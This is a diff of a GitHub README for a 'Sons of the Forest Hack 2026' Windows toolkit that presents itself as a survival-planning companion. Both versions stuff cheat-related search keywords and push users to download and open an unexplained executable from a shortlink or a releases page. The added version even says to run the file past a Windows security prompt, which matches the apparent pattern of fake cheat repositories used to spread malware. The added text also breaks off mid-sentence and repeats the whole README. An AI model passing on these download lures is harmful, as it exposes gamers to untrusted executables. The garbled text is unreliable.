@@ -1,364 +1,249 @@
-# 🌲 [DOWNLOAD SONS OF THE FOREST 2026 TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+# 🌲 sons-of-the-forest-hack-2026-island-expedition-toolkit - Plan Survival Expeditions With Confidence
 
-# 💀 Sons of the Forest Hack 2026 — Island Expedition Toolkit
+[![Download the Island Expedition Toolkit](https://img.shields.io/badge/Download_Island_Expedition_Toolkit-Visit_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases)
 
-Sons of the Forest hack-themed standalone PC companion focused on survival loadouts, base projects, crafting goals, resource planning, bunker expeditions, exploration notes, progression tracking, and survival analytics.
+The Sons of the Forest Hack 2026 Island Expedition Toolkit is a Windows companion for players who want a clear, organized place to plan survival loadouts, base projects, crafting goals, bunker expeditions, exploration notes, and progression analytics. It is built for everyday PC users who want practical planning tools without needing programming knowledge.
 
-## ⚡ SONS OF THE FOREST TOOLKIT 2026
+## 🚀 Download the Toolkit
 
-Inspired by searches for Sons of the Forest Hack, Sons of the Forest Cheats, SOTF Trainer, SOTF ESP, Sons of the Forest Mod Menu, God Mode, Item Hack, and Sons of the Forest Hack Download.
+Visit [this link](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases) to download the application.
 
-### Included Modules
+After the download finishes, open the downloaded file to launch the toolkit.
 
-- 🧍 Survivor Profiles
-- 🎒 Survival Loadouts
-- 🏠 Base Project Planner
-- 🔨 Crafting Goals
-- 🌲 Resource Planner
-- 🔦 Bunker Expedition Profiles
-- 🗺️ Exploration Notes
-- ⚔️ Manual Combat Practice
-- 🍖 Supply Planner
-- 📈 Progression Goals
-- 🗓️ Expedition History
-- 📊 Island Analytics
+## 🧭 What This Toolkit Does
 
----
+The toolkit keeps your island expedition planning in one place. Instead of scattering notes across paper, screenshots, and memory, you can build a simple planning hub for each survival run. The application is themed around the 2026 island expedition concept and focuses on practical organization for solo play, long-term base building, and exploration sessions.
 
-# 📥 DOWNLOAD
+Use it to prepare before you load into the island, track what you need while you play, and review your progress afterward. The goal is simple: fewer forgotten resources, clearer base plans, and better expedition notes.
 
-# 👉 [DOWNLOAD SOTF TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+## 🗺️ Survival Loadout Planning
 
-## Quick Start
+The loadout planner helps you decide what to carry before heading out. You can create loadout notes for different trip types, such as short resource runs, cave visits, bunker expeditions, or long-distance exploration.
 
-1. Download the package
-2. Extract the archive
-3. Launch the standalone companion
-4. Create your survivor profile
-5. Add equipment and supply goals
-6. Create base projects
-7. Plan exploration and bunker expeditions
-8. Track survival progression
+Helpful loadout categories include:
 
----
+- Tools and weapons for the trip
+- Food and hydration targets
+- Medical and recovery supplies
+- Building materials for small outposts
+- Utility items for caves and bunkers
+- Backup gear for longer expeditions
 
-# 🧍 Survivor Profiles
+You can also record set strength planning notes for each run. This gives you a place to write down target survival values, planned gear strength, and the items you want before a difficult section. The set strength area is useful when you want a repeatable plan instead of rebuilding your loadout from memory each time.
 
-Create profiles for different playstyles.
+## 🏕️ Base Project Tracking
 
-Track:
+Base building in Sons of the Forest can become a long checklist. The base project tracker gives each build its own notes, material targets, and completion status.
 
-`PROFILE → LOADOUT → ROLE → GOAL`
+Use the base project section to plan:
 
-Profiles:
+- Main base layouts and expansion ideas
+- Defensive walls and entry points
+- Storage areas and crafting stations
+- Resource gathering priorities
+- Sleep and recovery areas
+- Satellite outposts for exploration routes
 
-- Exploration
-- Combat
-- Building
-- Resource Gathering
-- Survival
-- Experimental
+You can break a large base into smaller projects. For example, one project can cover the main shelter, another can cover storage, and a third can cover defenses. This makes progress easier to see and reduces the chance of starting too many builds at once.
 
-Record:
+## ⚒️ Crafting Goal Management
 
-- Preferred Equipment
-- Weapons
-- Supplies
-- Personal Goals
-- Exploration Progress
+The crafting goal manager helps you track what you want to make next. You can list required materials, note where they come from, and mark goals as complete when you finish them.
 
----
+Common crafting goal entries include:
 
-# 🎒 Survival Loadouts
+- Tools needed for the next expedition
+- Weapons for bunker or cave routes
+- Utility items for base expansion
+- Upgrade materials for planned gear
+- Consumables for long sessions
+- Special items for themed 2026 island challenges
 
-Create reusable equipment profiles.
+Crafting goals can be sorted by priority. If a bunker trip needs a specific tool, place that goal at the top. If a base project needs extra storage, add the storage materials as a separate goal. The toolkit keeps those targets visible so you can gather with purpose.
 
-### EXPLORATION
+## 🕳️ Bunker Expedition Notes
 
-`WEAPON → TOOLS → FOOD → UTILITY`
+Bunker expeditions often need more preparation than surface exploration. The bunker notes area lets you record the plan for each bunker before you enter and update it afterward.
 
-### COMBAT
+Use bunker expedition notes for:
 
-`WEAPON → ARMOR → HEALING → UTILITY`
+- Entry and exit route reminders
+- Required tools and key items
+- Supply targets for the trip
+- Danger areas and fallback points
+- Loot priorities and collection goals
+- Completion status for each bunker
 
-### BUILDING
+You can create a separate note for each bunker or group bunkers by region. This is helpful when you want to clear several locations in one session or return later with better gear.
 
-`TOOLS → MATERIALS → FOOD → UTILITY`
+## 📌 Exploration Notes
 
-Compare setups for different activities.
+The exploration notes section is a flexible place for island discoveries. You can record landmarks, resource spots, cave entrances, safe routes, and anything else you want to remember.
 
----
+Exploration notes can include# 🌲 sons-of-the-forest-hack-2026-island-expedition-toolkit - Plan Survival Expeditions With Confidence
 
-# 🏠 Base Project Planner
+[![Download the Island Expedition Toolkit](https://img.shields.io/badge/Download_Island_Expedition_Toolkit-Visit_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases)
 
-Create construction projects.
+The Sons of the Forest Hack 2026 Island Expedition Toolkit is a Windows companion for players who want a clear, organized place to plan survival loadouts, base projects, crafting goals, bunker expeditions, exploration notes, and progression analytics. It is built for everyday PC users who want practical planning tools without needing programming knowledge. Whether you are preparing for a short resource run or a long bunker expedition, the toolkit keeps your plans in one place so you can focus on the island instead of scattered notes.
 
-Track:
+## 🚀 Download and Setup
 
-`PROJECT → MATERIALS → PRIORITY → STATUS`
+Visit [this link](https://github.com/vimap9601/sons-of-the-forest-hack-2026-island-expedition-toolkit/releases) to download the application.
 
-Projects:
+After the download finishes, open the downloaded file to launch the toolkit. The application is designed for Windows 10 and Windows 11. It runs like a normal desktop companion, so you do not need to install extra tools or configure anything technical.
 
-- Main Shelter
-- Storage
-- Defensive Structures
-- Utility Area
-- Food Storage
-- Expansion
-- Experimental Builds
+The download page is the official release location. Use the link above to reach the latest available version. Keep the downloaded file in a folder you can easily find, such as your Downloads folder, so you can open the toolkit whenever you plan your next session.
 
-Progress:
+## 🧭 What This Toolkit Does
 
-**PLANNED → GATHERING → BUILDING → COMPLETE**
+The toolkit keeps your island expedition planning in one place. Instead of scattering notes across paper, screenshots, and memory, you can build a simple planning hub for each survival run. The application is themed around the 2026 island expedition concept and focuses on practical organization for solo play, long-term base building, and exploration sessions.
 
----
+Use it to prepare before you load into the island, track what you need while you play, and review your progress afterward. The goal is simple: fewer forgotten resources, clearer base plans, and better expedition notes. The toolkit does not change the game itself. It is a companion planner that helps you think ahead, record discoveries, and keep your survival priorities visible.
 
-# 🔨 Crafting Goals
+## 🗺️ Survival Loadout Planning
 
-Create crafting roadmaps.
+The loadout planner helps you decide what to carry before heading out. You can create loadout notes for different trip types, such as short resource runs, cave visits, bunker expeditions, or long-distance exploration.
 
-Track:
+Helpful loadout categories include:
 
-`ITEM → MATERIALS → PURPOSE → STATUS`
+- Tools and weapons for the trip
+- Food and hydration targets
+- Medical and recovery supplies
+- Building materials for small outposts
+- Utility items for caves and bunkers
+- Backup gear for longer expeditions
 
-Categories:
+You can also record set strength planning notes for each run. This gives you a place to write down target survival values, planned gear strength, and the items you want before a difficult section. The set strength area is useful when you want a repeatable plan instead of rebuilding your loadout from memory each time. You can save multiple loadout profiles and switch between them depending on whether you are gathering wood, exploring a cave, or clearing a bunker.
 
-- Weapons
-- Armor
-- Tools
-- Survival Equipment
-- Utility
-- Base Items
+The planner also lets you mark items as ready, missing, or optional. That small status system makes it easy to see at a glance whether a loadout is complete. If you often forget a specific tool, add it to a checklist and keep it visible in your loadout notes.
 
-No items or materials are generated.
+## 🏕️ Base Project Tracking
 
----
+Base building in Sons of the Forest can become a long checklist. The base project tracker gives each build its own notes, material targets, and completion status.
 
-# 🌲 Resource Planner
+Use the base project section to plan:
 
-Create resource targets.
+- Main base layouts and expansion ideas
+- Defensive walls and entry points
+- Storage areas and crafting stations
+- Resource gathering priorities
+- Sleep and recovery areas
+- Satellite outposts for exploration routes
 
-Track:
+You can break a large base into smaller projects. For example, one project can cover the main shelter, another can cover storage, and a third can cover defenses. This makes progress easier to see and reduces the chance of starting too many builds at once. Each project can include a material list, a short description, and a priority level.
 
-`RESOURCE → TARGET → PROJECT → PROGRESS`
+If you like to build in stages, the tracker supports stage notes. You can write down what the base should look like after the first stage, the second stage, and the final stage. This is helpful for players who want a long-term base plan without feeling overwhelmed by every material at once.
 
-Use goals for:
+## ⚒️ Crafting Goal Management
 
-- Base Construction
-- Crafting
-- Exploration
-- Equipment
-- Supplies
+The crafting goal manager helps you track what you want to make next. You can list required materials, note where they come from, and mark goals as complete when you finish them.
 
-All resources remain obtained through normal gameplay.
+Common crafting goal entries include:
 
----
+- Tools needed for the next expedition
+- Weapons for bunker or cave routes
+- Utility items for base expansion
+- Upgrade materials for planned gear
+- Consumables for long sessions
+- Special items for themed 2026 island challenges
 
-# 🔦 Bunker Expedition Profiles
+Crafting goals can be sorted by priority. If a bunker trip needs a specific tool, place that goal at the top. If a base project needs extra storage, add the storage materials as a separate goal. The toolkit keeps those targets visible so you can gather with purpose.
 
-Prepare exploration sessions.
+You can also link a crafting goal to a loadout or base project. That connection makes it clear why you are gathering certain materials. For example, if a bunker expedition requires a repair tool, you can add the repair tool as a crafting goal and link it to the bunker note. This keeps your planning connected instead of fragmented.
 
-Track:
+## 🕳️ Bunker Expedition Notes
 
-`LOCATION → LOADOUT → OBJECTIVE → STATUS`
+Bunker expeditions often need more preparation than surface exploration. The bunker notes area lets you record the plan for each bunker before you enter and update it afterward.
 
-Plan:
+Use bunker expedition notes for:
 
-- Equipment
-- Supplies
-- Personal Route
-- Objectives
-- Return Preparation
-- Session Notes
+- Entry and exit route reminders
+- Required tools and key items
+- Supply targets for the trip
+- Danger areas and fallback points
+- Loot priorities and collection goals
+- Completion status for each bunker
 
-Status:
+You can create a separate note for each bunker or group bunkers by region. This is helpful when you want to clear several locations in one session or return later with better gear. Each note can include a simple checklist, so you can confirm that you have the right tools before you travel.
 
-**PLANNED → READY → EXPLORED**
+Bunker notes also work well as a record of what you found. After a trip, write down important items, locked doors, or areas that need a second visit. That way, your next expedition starts with better information.
 
----
+## 📌 Exploration Notes
 
-# 🗺️ Exploration Notes
+The exploration notes section is a flexible place for island discoveries. You can record landmarks, resource spots, cave entrances, safe routes, and anything else you want to remember.
 
-Create personal island references.
+Exploration notes can include:
 
-Track:
+- Map references and landmark descriptions
+- Resource locations for wood, stone, and other materials
+- Cave and bunker entrances
+- Safe travel routes between bases
+- Areas to avoid until you have better gear
+- Ideas for future expeditions
 
-`AREA → OBJECTIVE → EXPERIENCE → NOTES`
+You can organize notes by region or by trip. If you prefer a simple list, keep one note per discovery. If you like a more structured approach, group notes under headings such as “North Island,” “Caves,” or “Coastal Routes.” The toolkit is flexible enough to match the way you like to plan.
 
-Record:
+## 📊 Progression Analytics
 
-- Explored Areas
-- Personal Routes
-- Landmarks
-- Previous Expeditions
-- Future Objectives
+The progression analytics area gives you a simple overview of your planning progress. It is not a game overlay or a performance tracker. Instead, it helps you see how much of your own plan you have completed.
 
-Only information discovered normally or manually entered is recorded.
+Analytics can include:
 
----
+- Number of loadouts marked ready
+- Base projects in progress versus completed
+- Crafting goals finished and remaining
+- Bunker expeditions planned and cleared
+- Exploration notes added over time
 
-# ⚔️ Manual Combat Practice
+This overview is useful for players who like to set small goals. If you notice that many crafting goals are unfinished, you can spend a session gathering materials. If several bunker notes are marked as planned but not completed, you can choose one for your next trip. The analytics section turns your notes into a practical progress view.
 
-Create combat-training objectives.
+## 🧑‍💻 Tips for New Users
 
-Practice:
+If you are new to companion tools, start small. Create one loadout for your next trip, one base project for your current shelter, and one exploration note for a nearby landmark. You do not need to fill every section on the first day.
 
-- Movement
-- Blocking
-- Dodging
-- Manual Aim
-- Weapon Switching
-- Positioning
-- Timing
+A simple first session can look like this:
 
-Track:
+1. Open the toolkit after downloading it.
+2. Create a loadout called “Short Resource Run.”
+3. Add the tools and food you usually carry.
+4. Create a base project for your current shelter.
+5. Add one crafting goal for an item you want next.
+6. Write one exploration note about a place you want to visit.
 
-`DRILL → ATTEMPTS → RESULT → PROGRESS`
+Once those entries are in place, you can expand your notes over time. The toolkit is designed to grow with your survival run, so it works for both short sessions and long-term planning.
 
-Combat remains manually controlled.
+## 🛠️ Troubleshooting
 
----
+If the toolkit does not open after download, check that the file finished downloading and that you are opening it from a folder where you have normal permissions, such as your Downloads folder. If Windows shows a security prompt, review the file source and choose the option to run it only if you trust the download location.
 
-# 🍖 Supply Planner
+If the application opens but you do not see your notes, make sure you are using the same Windows user account and the same folder as before. Keep the application in a stable location instead of moving it between folders during a session.
 
-Create survival supply targets.
+If you need the latest version, return to the release page using the download link in this README. Replace your old copy with the newest download when a new release is available.
 
-Track:
+## ❓ Frequently Asked Questions
 
-`SUPPLY → TARGET → PURPOSE → STATUS`
+**Do I need programming knowledge to use this toolkit?**
+No. The toolkit is designed for average computer users. You open it, create notes, and use the planning sections like a normal desktop application.
 
-Categories:
+**Does this toolkit change the game?**
+No. It is a companion planner for loadouts, base projects, crafting goals, bunker expeditions, exploration notes, and progression analytics. It helps you organize your own plans.
 
-- Food
-- Water
-- Medicine
-- Ammunition
-- Armor
-- Exploration Supplies
+**Can I use it for multiple survival runs?**
+Yes. You can create separate notes and projects for different runs or planning styles. Many users keep one set of notes for a long-term base and another for short expedition sessions.
 
----
+**Where should I download the application?**
+Visit the release page linked at the top of this README and in the Download and Setup section. That page is the official place to download the application.
 
-# 📈 Progression Goals
+**What Windows versions are supported?**
+The toolkit is intended for Windows 10 and Windows 11. Keep your system updated for the best experience.
 
-Create long-term island objectives.
+**Can I edit my notes later?**
+Yes. Loadouts, base projects, crafting goals, bunker notes, and exploration notes are meant to be updated as your plan changes. You can mark items complete, change priorities, and add new details whenever you need.
 
-Examples:
+**What if I only want to use one section?**
+That is fine. Some users only use the loadout planner, while others focus on base projects. You can use as much or as little of the toolkit as you find helpful.
 
-- Finish New Base
-- Prepare Bunker Expedition
-- Complete Equipment Set
-- Explore New Area
-- Finish Crafting Project
-- Improve Combat
-- Expand Storage
+**How often should I update the toolkit?**
+Check the release page when you want the latest version. If your current copy works well for your planning needs, you can keep using it until you are ready to update.
 
-Status:
-
-**PLANNED → ACTIVE → COMPLETE**
-
----
-
-# 🗓️ Expedition History
-
-Record sessions manually.
-
-Track:
-
-`DATE → AREA → LOADOUT → RESULT`
-
-Record:
-
-- Areas Explored
-- Equipment Used
-- Projects
-- Resources
-- Objectives
-- Personal Notes
-
----
-
-# 📊 ISLAND ANALYTICS
-
-### SURVIVAL
-
-`Sessions → Supplies → Goals → Progress`
-
-### BASE
-
-`Projects → Materials → Completion → History`
-
-### EXPLORATION
-
-`Areas → Expeditions → Objectives → Progress`
-
-### COMBAT
-
-`Practice → Attempts → Results → Improvement`
-
----
-
-# ⚙️ ISLAND CONTROL PANEL
-
-### 🧍 SURVIVOR
-`Profiles` `Loadouts` `Equipment` `Goals`
-
-### 🏠 BASE
-`Projects` `Materials` `Storage` `Progress`
-
-### 🔦 EXPEDITIONS
-`Bunkers` `Areas` `Objectives` `History`
-
-### 🔨 CRAFTING
-`Items` `Materials` `Projects` `Goals`
-
-### ⚔️ SURVIVAL
-`Combat` `Supplies` `Practice` `Progress`
-
-### 📊 ANALYTICS
-`Base` `Exploration` `Combat` `Survival`
-
----
-
-# ❓ FAQ
-
-### Is this a Sons of the Forest Hack 2026?
-
-It is a hack-themed standalone Sons of the Forest survival-planning, exploration-tracking, and analytics companion.
-
-### Does it provide God Mode?
-
-No. Health, armor, stamina, damage, and other gameplay values are not modified.
-
-### Does it provide ESP or Wallhack?
-
-No. Hidden enemies, NPCs, items, resources, or unavailable world information are not revealed.
-
-### Does it provide Item or Resource Hack?
-
-No. Items, ammunition, materials, and inventory quantities are not generated or modified.
-
-### Does it provide Map Reveal?
-
-No. Unexplored or otherwise hidden world information is not revealed.
-
-### Does it provide Infinite Ammo or Stamina?
-
-No. Ammunition, stamina, health, and other resources remain controlled by the game.
-
-### Does it provide Auto Farm or automated combat?
-
-No. Gathering, building, movement, aiming, and combat remain manually controlled.
-
-### Does it inject into Sons of the Forest?
-
-No. The companion operates separately without code injection or protection bypass.
-
----
-
-# 🌲 DOWNLOAD AGAIN
-
-# 👉 [DOWNLOAD SONS OF THE FOREST HACK 2026](https://share.google/A46RYcexjg9XZiG59)
-
----
-
-**Keywords:** sons of the forest hack,sons of the forest hacks,sons of the forest cheat,sons of the forest cheats,sons of the forest hack 2026,sons of the forest cheat 2026,sotf hack,sotf cheats,sotf trainer,sons of the forest trainer,sons of the forest mod menu,sons of the forest hack menu,sons of the forest god mode,sons of the forest esp,sons of the forest wallhack,sons of the forest item hack,sons of the forest resource hack,sons of the forest infinite ammo,sons of the forest infinite stamina,sons of the forest map hack,sons of the forest map reveal,sons of the forest speed hack,sons of the forest free hack,sons of the forest free cheat,sons of the forest pc hack,sons of the forest hack download,sons of the forest cheat download,sons of the forest mod menu download,sotf hack download,sotf trainer download,sons of the forest base planner,sons of the forest crafting planner,sons of the forest survival tools,sons of the forest bunker guide,sons of the forest exploration tracker
+Keywords: sons-forest-set-strength-hack, sons-of-the-forest, sons-of-the-forest-fling, sons of the forest hack 2026, island expedition toolkit, survival loadouts, base projects, crafting goals, bunker expeditions, exploration notes, progression analytics
